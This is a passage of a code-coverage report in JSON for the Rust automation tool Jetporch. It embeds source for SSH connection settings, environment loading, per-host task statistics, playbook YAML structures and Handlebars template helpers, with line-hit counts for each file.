\u0026Arc\u003cRwLock\u003cHost\u003e\u003e, vars_input: serde_yaml::Mapping, tm: TemplateMode) -\u003e Result\u003cbool,String\u003e {\n        let mut vars = self.get_complete_blended_variables_as_value(host, BlendTarget::NotTemplateModule);\n        blend_variables(\u0026mut vars, serde_yaml::Value::Mapping(vars_input));\n        return match vars {\n            serde_yaml::Value::Mapping(x) =\u003e self.templar.read().unwrap().test_condition(expr, x, tm),\n            _ =\u003e { panic!(\"impossible input to test_condition\"); }\n        };\n    }\n\n    // when a host needs to connect over SSH it asks this function - we can use some settings configured\n    // already on the context or check some variables in inventory.\n\n    // FIXME: this should return a struct\n\n    pub fn get_ssh_connection_details(\u0026self, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e (String,String,i64,Option\u003cString\u003e,Option\u003cString\u003e,Option\u003cString\u003e) {\n\n        let vars = self.get_complete_blended_variables(host,BlendTarget::NotTemplateModule);\n        let host2 = host.read().unwrap();\n\n        let remote_hostname = match vars.contains_key(\u0026String::from(\"jet_ssh_hostname\")) {\n            true =\u003e match vars.get(\u0026String::from(\"jet_ssh_hostname\")).unwrap().as_str() {\n                Some(x) =\u003e String::from(x),\n                None =\u003e host2.name.clone()\n            },\n            false =\u003e host2.name.clone()\n        };\n        let remote_user = match vars.contains_key(\u0026String::from(\"jet_ssh_user\")) {\n            true =\u003e match vars.get(\u0026String::from(\"jet_ssh_user\")).unwrap().as_str() {\n                Some(x) =\u003e String::from(x),\n                None =\u003e self.ssh_user.clone()\n            },\n            false =\u003e self.ssh_user.clone()\n        };\n        let remote_port = match vars.contains_key(\u0026String::from(\"jet_ssh_port\")) {\n            true =\u003e match vars.get(\u0026String::from(\"jet_ssh_port\")).unwrap().as_str() {\n                Some(x) =\u003e {\n                    match x.parse::\u003ci64\u003e() {\n                        Ok(ix) =\u003e ix,\n                        Err(_) =\u003e self.ssh_port\n                    }\n                },\n                None =\u003e match vars.get(\u0026String::from(\"jet_ssh_port\")).unwrap().as_i64() {\n                    Some(x) =\u003e x,\n                    None =\u003e self.ssh_port\n                }\n            },\n            false =\u003e {\n                self.ssh_port\n            }\n        };\n        let keyfile : Option\u003cString\u003e = match vars.contains_key(\u0026String::from(\"jet_ssh_private_key_file\")) {\n            true =\u003e match vars.get(\u0026String::from(\"jet_ssh_private_key_file\")).unwrap().as_str() {\n                Some(x) =\u003e {\n                    match expanduser(String::from(x)) {\n                        Ok(expanded) =\u003e Some(expanded.display().to_string()),\n                        Err(_) =\u003e None\n                    }\n                }\n                None =\u003e None\n            },\n            false =\u003e None\n        };\n        let passphrase : Option\u003cString\u003e = match vars.contains_key(\u0026String::from(\"jet_ssh_private_key_passphrase\")) {\n            true =\u003e match vars.get(\u0026String::from(\"jet_ssh_private_key_passphrase\")).unwrap().as_str() {\n                Some(x) =\u003e Some(String::from(x)),\n                None =\u003e  None\n            },\n            false =\u003e match env::var(\"JET_SSH_PRIVATE_KEY_PASSPHRASE\") {\n                Ok(x) =\u003e Some(x),\n                Err(_) =\u003e None\n            }\n        };\n        let key_comment: Option\u003cString\u003e = match vars.contains_key(\u0026String::from(\"jet_ssh_key_comment\")) {\n            true =\u003e match vars.get(\u0026String::from(\"jet_ssh_key_comment\")).unwrap().as_str() {\n                Some(x) =\u003e Some(String::from(x)),\n                None =\u003e  None\n            },\n            false =\u003e match env::var(\"JET_SSH_KEY_COMMENT\") {\n                Ok(x) =\u003e Some(x),\n                Err(_) =\u003e None\n             }\n        };\n\n\n        return (remote_hostname, remote_user, remote_port, keyfile, passphrase, key_comment)\n    } \n\n    // loads environment variables into the context, adding an \"ENV_foo\" prefix\n    // to each environment variable \"foo\". These variables will only be made available\n    // to the template module since we use them for secret management features.\n\n    pub fn load_environment(\u0026mut self) {\n        let mut my_env = self.env_storage.write().unwrap();\n        // some common environment variables that may occur are not useful for playbooks\n        // or they have no need to share that with other hosts\n        let do_not_load = vec![\n            \"OLDPWD\",\n            \"PWD\",\n            \"SHLVL\",\n            \"SSH_AUTH_SOCK\",\n            \"SSH_AGENT_PID\",\n            \"TERM_SESSION_ID\",\n            \"XPC_FLAGS\",\n            \"XPC_SERVICE_NAME\",\n            \"_\"\n        ];\n        \n        for (k,v) in env::vars() {\n            if ! do_not_load.contains(\u0026k.as_str()) {\n                my_env.insert(serde_yaml::Value::String(format!(\"ENV_{k}\")) , serde_yaml::Value::String(v));\n            }\n        }\n    }\n\n    // various functions in Jet make use of GUIDs, for example for temp file locations\n\n    pub fn get_guid(\u0026self) -\u003e String {\n        return GUID::rand().to_string();\n    }\n\n    // ==================================================================================\n    // STATISTICS\n\n    pub fn get_role_count(\u0026self) -\u003e usize {\n        return self.role_count;\n    }\n\n    pub fn increment_role_count(\u0026mut self) {\n        self.role_count = self.role_count + 1;\n    }\n\n    pub fn get_task_count(\u0026self) -\u003e usize {\n        return self.task_count;\n    }\n\n    pub fn increment_task_count(\u0026mut self) {\n        self.task_count = self.task_count + 1;\n    }\n\n    pub fn increment_attempted_for_host(\u0026mut self, host: \u0026String) {\n        *self.attempted_count_for_host.entry(host.clone()).or_insert(0) += 1;\n    }\n\n    pub fn increment_created_for_host(\u0026mut self, host: \u0026String) {\n        *self.created_count_for_host.entry(host.clone()).or_insert(0) += 1;\n        *self.adjusted_count_for_host.entry(host.clone()).or_insert(0) += 1;\n    }\n\n    pub fn increment_removed_for_host(\u0026mut self, host: \u0026String) {\n        *self.removed_count_for_host.entry(host.clone()).or_insert(0) += 1;\n        *self.adjusted_count_for_host.entry(host.clone()).or_insert(0) += 1;\n    }\n\n    pub fn increment_modified_for_host(\u0026mut self, host: \u0026String) {\n        *self.modified_count_for_host.entry(host.clone()).or_insert(0) += 1;\n        *self.adjusted_count_for_host.entry(host.clone()).or_insert(0) += 1;\n    }\n\n    pub fn increment_executed_for_host(\u0026mut self, host: \u0026String) {\n        *self.executed_count_for_host.entry(host.clone()).or_insert(0) += 1;\n        *self.adjusted_count_for_host.entry(host.clone()).or_insert(0) += 1;\n    }\n\n    pub fn increment_failed_for_host(\u0026mut self, host: \u0026String) {\n        *self.failed_count_for_host.entry(host.clone()).or_insert(0) += 1;\n    }\n\n    pub fn increment_passive_for_host(\u0026mut self, host: \u0026String) {\n        *self.passive_count_for_host.entry(host.clone()).or_insert(0) += 1;\n    }\n\n    pub fn increment_matched_for_host(\u0026mut self, host: \u0026String) {\n        *self.matched_count_for_host.entry(host.clone()).or_insert(0) += 1;\n    }\n\n    pub fn increment_skipped_for_host(\u0026mut self, host: \u0026String) {\n        *self.skipped_count_for_host.entry(host.clone()).or_insert(0) += 1;\n    }\n\n    pub fn get_total_attempted_count(\u0026self) -\u003e usize {\n        return self.attempted_count_for_host.values().fold(0, |ttl, \u0026x| ttl + x);\n    }\n\n    pub fn get_total_creation_count(\u0026self) -\u003e usize {\n        return self.created_count_for_host.values().fold(0, |ttl, \u0026x| ttl + x);\n    }\n\n    pub fn get_total_modified_count(\u0026self) -\u003e usize{\n        return self.modified_count_for_host.values().fold(0, |ttl, \u0026x| ttl + x);\n    }\n\n    pub fn get_total_removal_count(\u0026self) -\u003e usize{\n        return self.removed_count_for_host.values().fold(0, |ttl, \u0026x| ttl + x);\n    }\n\n    pub fn get_total_executions_count(\u0026self) -\u003e usize {\n        return self.executed_count_for_host.values().fold(0, |ttl, \u0026x| ttl + x);\n    }\n\n    pub fn get_total_failed_count(\u0026self) -\u003e usize{\n        return self.failed_count_for_host.values().fold(0, |ttl, \u0026x| ttl + x);\n    }\n\n    pub fn get_total_adjusted_count(\u0026self) -\u003e usize {\n        return self.adjusted_count_for_host.values().fold(0, |ttl, \u0026x| ttl + x);\n    }\n\n    pub fn get_total_passive_count(\u0026self) -\u003e usize {\n        return self.passive_count_for_host.values().fold(0, |ttl, \u0026x| ttl + x);\n    }\n\n    pub fn get_total_matched_count(\u0026self) -\u003e usize {\n        return self.matched_count_for_host.values().fold(0, |ttl, \u0026x| ttl + x);\n    }\n\n    pub fn get_total_skipped_count(\u0026self) -\u003e usize {\n        return self.skipped_count_for_host.values().fold(0, |ttl, \u0026x| ttl + x);\n    }\n\n    pub fn get_hosts_creation_count(\u0026self) -\u003e usize {\n        return self.created_count_for_host.keys().len();\n    }\n\n    pub fn get_hosts_modified_count(\u0026self) -\u003e usize {\n        return self.modified_count_for_host.keys().len();\n    }\n\n    pub fn get_hosts_removal_count(\u0026self) -\u003e usize {\n        return self.removed_count_for_host.keys().len();\n    }\n\n    pub fn get_hosts_executions_count(\u0026self) -\u003e usize {\n        return self.executed_count_for_host.keys().len();\n    }\n\n    pub fn get_hosts_passive_count(\u0026self) -\u003e usize {\n        return self.passive_count_for_host.keys().len();\n    }\n\n    pub fn get_hosts_matched_count(\u0026self) -\u003e usize {\n        return self.matched_count_for_host.keys().len();\n    }\n\n    pub fn get_hosts_skipped_count(\u0026self) -\u003e usize {\n        return self.skipped_count_for_host.keys().len();\n    }\n\n    pub fn get_hosts_failed_count(\u0026self) -\u003e usize {\n        return self.failed_count_for_host.keys().len();\n    }\n\n    pub fn get_hosts_adjusted_count(\u0026self) -\u003e usize {\n        return self.adjusted_count_for_host.keys().len();\n    }\n\n    pub fn get_hosts_seen_count(\u0026self) -\u003e usize {\n        return self.seen_hosts.keys().len();\n    }\n    \n\n\n}","traces":[{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":160,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":178,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":195,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":199,"address":[],"length":0,"stats":{"Line":0}},{"line":200,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":202,"address":[],"length":0,"stats":{"Line":0}},{"line":206,"address":[],"length":0,"stats":{"Line":0}},{"line":207,"address":[],"length":0,"stats":{"Line":0}},{"line":208,"address":[],"length":0,"stats":{"Line":0}},{"line":209,"address":[],"length":0,"stats":{"Line":0}},{"line":210,"address":[],"length":0,"stats":{"Line":0}},{"line":212,"address":[],"length":0,"stats":{"Line":0}},{"line":213,"address":[],"length":0,"stats":{"Line":0}},{"line":217,"address":[],"length":0,"stats":{"Line":0}},{"line":218,"address":[],"length":0,"stats":{"Line":0}},{"line":219,"address":[],"length":0,"stats":{"Line":0}},{"line":220,"address":[],"length":0,"stats":{"Line":0}},{"line":221,"address":[],"length":0,"stats":{"Line":0}},{"line":227,"address":[],"length":0,"stats":{"Line":0}},{"line":228,"address":[],"length":0,"stats":{"Line":0}},{"line":229,"address":[],"length":0,"stats":{"Line":0}},{"line":230,"address":[],"length":0,"stats":{"Line":0}},{"line":231,"address":[],"length":0,"stats":{"Line":0}},{"line":235,"address":[],"length":0,"stats":{"Line":0}},{"line":237,"address":[],"length":0,"stats":{"Line":0}},{"line":238,"address":[],"length":0,"stats":{"Line":0}},{"line":239,"address":[],"length":0,"stats":{"Line":0}},{"line":240,"address":[],"length":0,"stats":{"Line":0}},{"line":242,"address":[],"length":0,"stats":{"Line":0}},{"line":243,"address":[],"length":0,"stats":{"Line":0}},{"line":244,"address":[],"length":0,"stats":{"Line":0}},{"line":246,"address":[],"length":0,"stats":{"Line":0}},{"line":247,"address":[],"length":0,"stats":{"Line":0}},{"line":249,"address":[],"length":0,"stats":{"Line":0}},{"line":250,"address":[],"length":0,"stats":{"Line":0}},{"line":251,"address":[],"length":0,"stats":{"Line":0}},{"line":253,"address":[],"length":0,"stats":{"Line":0}},{"line":254,"address":[],"length":0,"stats":{"Line":0}},{"line":255,"address":[],"length":0,"stats":{"Line":0}},{"line":257,"address":[],"length":0,"stats":{"Line":0}},{"line":259,"address":[],"length":0,"stats":{"Line":0}},{"line":260,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":264,"address":[],"length":0,"stats":{"Line":0}},{"line":265,"address":[],"length":0,"stats":{"Line":0}},{"line":266,"address":[],"length":0,"stats":{"Line":0}},{"line":269,"address":[],"length":0,"stats":{"Line":0}},{"line":276,"address":[],"length":0,"stats":{"Line":0}},{"line":277,"address":[],"length":0,"stats":{"Line":0}},{"line":278,"address":[],"length":0,"stats":{"Line":0}},{"line":283,"address":[],"length":0,"stats":{"Line":0}},{"line":284,"address":[],"length":0,"stats":{"Line":0}},{"line":285,"address":[],"length":0,"stats":{"Line":0}},{"line":290,"address":[],"length":0,"stats":{"Line":0}},{"line":291,"address":[],"length":0,"stats":{"Line":0}},{"line":292,"address":[],"length":0,"stats":{"Line":0}},{"line":293,"address":[],"length":0,"stats":{"Line":0}},{"line":294,"address":[],"length":0,"stats":{"Line":0}},{"line":295,"address":[],"length":0,"stats":{"Line":0}},{"line":304,"address":[],"length":0,"stats":{"Line":0}},{"line":306,"address":[],"length":0,"stats":{"Line":0}},{"line":307,"address":[],"length":0,"stats":{"Line":0}},{"line":309,"address":[],"length":0,"stats":{"Line":0}},{"line":310,"address":[],"length":0,"stats":{"Line":0}},{"line":311,"address":[],"length":0,"stats":{"Line":0}},{"line":312,"address":[],"length":0,"stats":{"Line":0}},{"line":314,"address":[],"length":0,"stats":{"Line":0}},{"line":316,"address":[],"length":0,"stats":{"Line":0}},{"line":317,"address":[],"length":0,"stats":{"Line":0}},{"line":318,"address":[],"length":0,"stats":{"Line":0}},{"line":319,"address":[],"length":0,"stats":{"Line":0}},{"line":321,"address":[],"length":0,"stats":{"Line":0}},{"line":323,"address":[],"length":0,"stats":{"Line":0}},{"line":324,"address":[],"length":0,"stats":{"Line":0}},{"line":325,"address":[],"length":0,"stats":{"Line":0}},{"line":326,"address":[],"length":0,"stats":{"Line":0}},{"line":327,"address":[],"length":0,"stats":{"Line":0}},{"line":328,"address":[],"length":0,"stats":{"Line":0}},{"line":331,"address":[],"length":0,"stats":{"Line":0}},{"line":332,"address":[],"length":0,"stats":{"Line":0}},{"line":333,"address":[],"length":0,"stats":{"Line":0}},{"line":337,"address":[],"length":0,"stats":{"Line":0}},{"line":340,"address":[],"length":0,"stats":{"Line":0}},{"line":341,"address":[],"length":0,"stats":{"Line":0}},{"line":342,"address":[],"length":0,"stats":{"Line":0}},{"line":343,"address":[],"length":0,"stats":{"Line":0}},{"line":344,"address":[],"length":0,"stats":{"Line":0}},{"line":345,"address":[],"length":0,"stats":{"Line":0}},{"line":348,"address":[],"length":0,"stats":{"Line":0}},{"line":350,"address":[],"length":0,"stats":{"Line":0}},{"line":352,"address":[],"length":0,"stats":{"Line":0}},{"line":353,"address":[],"length":0,"stats":{"Line":0}},{"line":354,"address":[],"length":0,"stats":{"Line":0}},{"line":355,"address":[],"length":0,"stats":{"Line":0}},{"line":357,"address":[],"length":0,"stats":{"Line":0}},{"line":358,"address":[],"length":0,"stats":{"Line":0}},{"line":359,"address":[],"length":0,"stats":{"Line":0}},{"line":362,"address":[],"length":0,"stats":{"Line":0}},{"line":363,"address":[],"length":0,"stats":{"Line":0}},{"line":364,"address":[],"length":0,"stats":{"Line":0}},{"line":365,"address":[],"length":0,"stats":{"Line":0}},{"line":367,"address":[],"length":0,"stats":{"Line":0}},{"line":368,"address":[],"length":0,"stats":{"Line":0}},{"line":369,"address":[],"length":0,"stats":{"Line":0}},{"line":374,"address":[],"length":0,"stats":{"Line":0}},{"line":381,"address":[],"length":0,"stats":{"Line":0}},{"line":382,"address":[],"length":0,"stats":{"Line":0}},{"line":385,"address":[],"length":0,"stats":{"Line":0}},{"line":397,"address":[],"length":0,"stats":{"Line":0}},{"line":398,"address":[],"length":0,"stats":{"Line":0}},{"line":399,"address":[],"length":0,"stats":{"Line":0}},{"line":406,"address":[],"length":0,"stats":{"Line":0}},{"line":407,"address":[],"length":0,"stats":{"Line":0}},{"line":413,"address":[],"length":0,"stats":{"Line":0}},{"line":414,"address":[],"length":0,"stats":{"Line":0}},{"line":417,"address":[],"length":0,"stats":{"Line":0}},{"line":418,"address":[],"length":0,"stats":{"Line":0}},{"line":421,"address":[],"length":0,"stats":{"Line":0}},{"line":422,"address":[],"length":0,"stats":{"Line":0}},{"line":425,"address":[],"length":0,"stats":{"Line":0}},{"line":426,"address":[],"length":0,"stats":{"Line":0}},{"line":429,"address":[],"length":0,"stats":{"Line":0}},{"line":430,"address":[],"length":0,"stats":{"Line":0}},{"line":433,"address":[],"length":0,"stats":{"Line":0}},{"line":434,"address":[],"length":0,"stats":{"Line":0}},{"line":435,"address":[],"length":0,"stats":{"Line":0}},{"line":438,"address":[],"length":0,"stats":{"Line":0}},{"line":439,"address":[],"length":0,"stats":{"Line":0}},{"line":440,"address":[],"length":0,"stats":{"Line":0}},{"line":443,"address":[],"length":0,"stats":{"Line":0}},{"line":444,"address":[],"length":0,"stats":{"Line":0}},{"line":445,"address":[],"length":0,"stats":{"Line":0}},{"line":448,"address":[],"length":0,"stats":{"Line":0}},{"line":449,"address":[],"length":0,"stats":{"Line":0}},{"line":450,"address":[],"length":0,"stats":{"Line":0}},{"line":453,"address":[],"length":0,"stats":{"Line":0}},{"line":454,"address":[],"length":0,"stats":{"Line":0}},{"line":457,"address":[],"length":0,"stats":{"Line":0}},{"line":458,"address":[],"length":0,"stats":{"Line":0}},{"line":461,"address":[],"length":0,"stats":{"Line":0}},{"line":462,"address":[],"length":0,"stats":{"Line":0}},{"line":465,"address":[],"length":0,"stats":{"Line":0}},{"line":466,"address":[],"length":0,"stats":{"Line":0}},{"line":469,"address":[],"length":0,"stats":{"Line":0}},{"line":470,"address":[],"length":0,"stats":{"Line":0}},{"line":473,"address":[],"length":0,"stats":{"Line":0}},{"line":474,"address":[],"length":0,"stats":{"Line":0}},{"line":477,"address":[],"length":0,"stats":{"Line":0}},{"line":478,"address":[],"length":0,"stats":{"Line":0}},{"line":481,"address":[],"length":0,"stats":{"Line":0}},{"line":482,"address":[],"length":0,"stats":{"Line":0}},{"line":485,"address":[],"length":0,"stats":{"Line":0}},{"line":486,"address":[],"length":0,"stats":{"Line":0}},{"line":489,"address":[],"length":0,"stats":{"Line":0}},{"line":490,"address":[],"length":0,"stats":{"Line":0}},{"line":493,"address":[],"length":0,"stats":{"Line":0}},{"line":494,"address":[],"length":0,"stats":{"Line":0}},{"line":497,"address":[],"length":0,"stats":{"Line":0}},{"line":498,"address":[],"length":0,"stats":{"Line":0}},{"line":501,"address":[],"length":0,"stats":{"Line":0}},{"line":502,"address":[],"length":0,"stats":{"Line":0}},{"line":505,"address":[],"length":0,"stats":{"Line":0}},{"line":506,"address":[],"length":0,"stats":{"Line":0}},{"line":509,"address":[],"length":0,"stats":{"Line":0}},{"line":510,"address":[],"length":0,"stats":{"Line":0}},{"line":513,"address":[],"length":0,"stats":{"Line":0}},{"line":514,"address":[],"length":0,"stats":{"Line":0}},{"line":517,"address":[],"length":0,"stats":{"Line":0}},{"line":518,"address":[],"length":0,"stats":{"Line":0}},{"line":521,"address":[],"length":0,"stats":{"Line":0}},{"line":522,"address":[],"length":0,"stats":{"Line":0}},{"line":525,"address":[],"length":0,"stats":{"Line":0}},{"line":526,"address":[],"length":0,"stats":{"Line":0}},{"line":529,"address":[],"length":0,"stats":{"Line":0}},{"line":530,"address":[],"length":0,"stats":{"Line":0}},{"line":533,"address":[],"length":0,"stats":{"Line":0}},{"line":534,"address":[],"length":0,"stats":{"Line":0}},{"line":537,"address":[],"length":0,"stats":{"Line":0}},{"line":538,"address":[],"length":0,"stats":{"Line":0}},{"line":541,"address":[],"length":0,"stats":{"Line":0}},{"line":542,"address":[],"length":0,"stats":{"Line":0}},{"line":545,"address":[],"length":0,"stats":{"Line":0}},{"line":546,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":241},{"path":["/","Users","wings","projects","jetpack","src","playbooks","language.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse serde::{Deserialize};\nuse crate::registry::list::Task;\n\n// all the playbook language YAML structures!\n\n#[derive(Debug,Deserialize)]\n#[serde(deny_unknown_fields)]\npub struct Play {\n    pub name : String,\n    pub groups : Vec\u003cString\u003e,\n    pub roles : Option\u003cVec\u003cRoleInvocation\u003e\u003e,\n    pub defaults: Option\u003cserde_yaml::Mapping\u003e,\n    pub vars : Option\u003cserde_yaml::Mapping\u003e,\n    pub vars_files: Option\u003cVec\u003cString\u003e\u003e,\n    pub sudo: Option\u003cString\u003e,\n    pub sudo_template: Option\u003cString\u003e,\n    pub ssh_user : Option\u003cString\u003e,\n    pub ssh_port : Option\u003ci64\u003e,\n    pub tasks : Option\u003cVec\u003cTask\u003e\u003e,\n    pub handlers : Option\u003cVec\u003cTask\u003e\u003e,\n    pub batch_size : Option\u003cusize\u003e,\n}\n\n#[derive(Debug,Deserialize,Clone)]\n#[serde(deny_unknown_fields)]\npub struct Role {\n    pub name: String,\n    pub defaults: Option\u003cserde_yaml::Mapping\u003e,\n    pub tasks: Option\u003cVec\u003cString\u003e\u003e,\n    pub handlers: Option\u003cVec\u003cString\u003e\u003e\n}\n\n#[derive(Debug,Deserialize)]\n#[serde(deny_unknown_fields)]\npub struct RoleInvocation {\n    pub role: String,\n    pub vars: Option\u003cserde_yaml::Mapping\u003e,\n    pub tags: Option\u003cVec\u003cString\u003e\u003e\n}\n\n// for Task/module definitions see registry/list.rs\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","playbooks","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub mod language;\npub mod context;\npub mod visitor;\npub mod traversal;\npub mod templar;\npub mod task_fsm;\npub mod t_helpers;\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","playbooks","t_helpers.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Jetporch Project Contributors\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse handlebars::{Handlebars, RenderError, HelperDef, RenderContext, ScopedJson, JsonValue, Helper, Context, handlebars_helper};\n\n//#[allow(non_camel_case_types)]\npub struct IsDefined;\n\nimpl HelperDef for IsDefined {\n    fn call_inner\u003c'reg: 'rc, 'rc\u003e(\n        \u0026self,\n        h: \u0026Helper\u003c'reg, 'rc\u003e,\n        _: \u0026'reg Handlebars,\n        _: \u0026'rc Context,\n        _: \u0026mut RenderContext\u003c'reg, 'rc\u003e,\n    ) -\u003e Result\u003cScopedJson\u003c'reg, 'rc\u003e, RenderError\u003e {\n        let params = h.params();\n        if params.len() != 1 {\n            return Err(RenderError::new(\n                \"is_defined: requires one parameter\".to_owned(),\n            ));\n        }\n        let result = h.param(0)\n            .and_then(|x| {\n                if x.is_value_missing() {\n                    Some(false)\n                } else {\n                    Some(true)\n                }\n            })\n            .ok_or_else(|| RenderError::new(\"is_defined: Couldn't read parameter\".to_owned()))?;\n\n        Ok(ScopedJson::Derived(JsonValue::from(result)))\n    }\n}\n\npub fn register_helpers(handlebars: \u0026mut Handlebars) {\n    {\n        handlebars_helper!(to_lower_case: |v: str| v.to_lowercase());\n        handlebars.register_helper(\"to_lower_case\", Box::new(to_lower_case))\n    }\n    {\n        handlebars_helper!(to_upper_case: |v: str| v.to_uppercase());\n        handlebars.register_helper(\"to_upper_case\", Box::new(to_upper_case))\n    }\n    {\n        handlebars_helper!(trim: |v: str| v.trim());\n        handlebars.register_helper(\"trim\", Box::new(trim))\n    }\n    {\n        handlebars_helper!(trim_start: |v: str| v.trim_start());\n        handlebars.register_helper(\"trim_start\", Box::new(trim_start))\n    }\n    {\n        handlebars_helper!(trim_end: |v: str| v.trim_end());\n        handlebars.register_helper(\"trim_end\", Box::new(trim_end))\n    }\n    {\n        handlebars_helper!(contains: |v: str, s: str| v.contains(s));\n        handlebars.register_helper(\"contains\", Box::new(contains))\n    }\n    {\n        handlebars_helper!(starts_with: |v: str, s: str| v.starts_with(s));\n        handlebars.register_helper(\"starts_with\", Box::new(starts_with))\n    }\n    {\n        handlebars_helper!(ends_with: |v: str, s: str| v.ends_with(s));\n        handlebars.register_helper(\"ends_with\", Box::new(ends_with))\n    }\n    {\n        handlebars.register_helper(\"isdefined\", Box::new(IsDefined));\n    }\n}\n\n","traces":[{"line":22,"address":[],"length":0,"stats":{"Line":13}},{"line":29,"address":[],"length":0,"stats":{"Line":13}},{"line":30,"address":[],"length":0,"stats":{"Line":13}},{"line":31,"address":[],"length":0,"stats":{"Line":1}},{"line":32,"address":[],"length":0,"stats":{"Line":1}},{"line":35,"address":[],"length":0,"stats":{"Line":12}},{"line":36,"address":[],"length":0,"stats":{"Line":12}},{"line":37,"address":[],"length":0,"stats":{"Line":12}},{"line":38,"address":[],"length":0,"stats":{"Line":6}},{"line":40,"address":[],"length":0,"stats":{"Line":6}},{"line":43,"address":[],"length":0,"stats":{"Line":0}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":19}},{"line":51,"address":[],"length":0,"stats":{"Line":19}},{"line":52,"address":[],"length":0,"stats":{"Line":19}},{"line":55,"address":[],"length":0,"stats":{"Line":19}},{"line":56,"address":[],"length":0,"stats":{"Line":19}},{"line":59,"address":[],"length":0,"stats":{"Line":19}},{"line":60,"address":[],"length":0,"stats":{"Line":19}},{"line":63,"address":[],"length":0,"stats":{"Line":19}},{"line":64,"